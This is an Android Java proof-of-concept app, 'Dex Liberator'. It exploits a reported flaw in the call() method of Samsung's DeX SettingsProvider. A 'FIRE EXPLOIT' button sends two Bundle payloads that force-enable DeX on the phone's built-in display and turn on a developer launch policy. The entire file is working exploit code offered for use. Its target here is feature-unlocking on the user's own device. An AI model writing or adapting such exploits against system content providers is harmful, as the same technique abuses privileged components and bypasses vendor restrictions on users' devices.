package com.example.dexliberator; // <--- MAKE SURE THIS MATCHES YOUR PACKAGE NAME AT THE TOP!

import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/**
 * Main entry point for the Dex Liberator PoC application.
 *
 * This Activity provides a user interface to trigger an exploit targeting the
 * `com.sec.android.desktopmode.uiservice.SettingsProvider`.
 * By interacting with this provider, the application attempts to enable
 * Samsung DeX features on the device's built-in display and unlock developer options,
 * utilizing a vulnerability in the `call()` method of the provider.
 */
public class MainActivity extends AppCompatActivity {

    /**
     * Initializes the Activity, sets up the UI, and configures the exploit trigger.
     *
     * This method programmatically creates a simple UI consisting of a "FIRE EXPLOIT" button.
     * It also sets up a click listener for the button that first checks if the application
     * has the `WRITE_SETTINGS` permission. If not, it prompts the user to grant it.
     * Once permission is granted, clicking the button invokes the {@link #fireExploit()} method.
     *
     * @param savedInstanceState If the activity is being re-initialized after previously being shut down then this Bundle contains the data it most recently supplied in onSaveInstanceState(Bundle). Note: Otherwise it is null.
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Build the UI
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);

        Button btnFire = new Button(this);
        btnFire.setText("FIRE EXPLOIT"); // <--- LOOK FOR THIS BUTTON
        btnFire.setTextSize(24f);
        layout.addView(btnFire);

        setContentView(layout);

        // 2. The Button Logic
        btnFire.setOnClickListener(v -> {
            if (Settings.System.canWrite(this)) {
                // If we have permission, FIRE!
                fireExploit();
            } else {
                // If not, ask for it
                Toast.makeText(this, "Grant Permission First!", Toast.LENGTH_SHORT).show();
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
    }

    /**
     * Executes the exploit payload against the target ContentProvider.
     *
     * This method runs on a background thread to perform ContentResolver operations.
     * It constructs specific Bundles containing key-value pairs that are passed to the
     * `call` method of `com.sec.android.desktopmode.uiservice.SettingsProvider`.
     *
     * The payloads are designed to:
     * 1. Enable DeX mode on the built-in display (`enable_dex_on_builtin_display`).
     * 2. Enable developer mode for launch policies (`launch_policy_developer_enabled`).
     *
     * Upon completion (success or failure), it posts a Toast message back to the main UI thread.
     */
    private void fireExploit() {
        new Thread(() -> {
            try {
                ContentResolver resolver = getContentResolver();
                Uri providerUri = Uri.parse("content://com.sec.android.desktopmode.uiservice.SettingsProvider");

                // Payload 1: Enable DeX on Phone
                // This payload sets the 'enable_dex_on_builtin_display' setting to 'true'.
                // This is the core of the exploit, allowing DeX to run without an external monitor.
                Bundle p1 = new Bundle();
                p1.putString("key", "enable_dex_on_builtin_display");
                p1.putString("val", "true");
                resolver.call(providerUri, "setSettings", null, p1);

                // Payload 2: Enable Dev Mode
                // This payload sets the 'launch_policy_developer_enabled' setting to 'true'.
                // This enables developer options within the DeX environment.
                Bundle p2 = new Bundle();
                p2.putString("key", "launch_policy_developer_enabled");
                p2.putString("val", "true");
                resolver.call(providerUri, "setSettings", null, p2);

                // Success Message
                runOnUiThread(() -> Toast.makeText(this, "☢️ PAYLOAD DELIVERED ☢️", Toast.LENGTH_LONG).show());

            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "ERROR: " + e.getMessage(), Toast.LENGTH_LONG).show());
            }
        }).start();
    }
}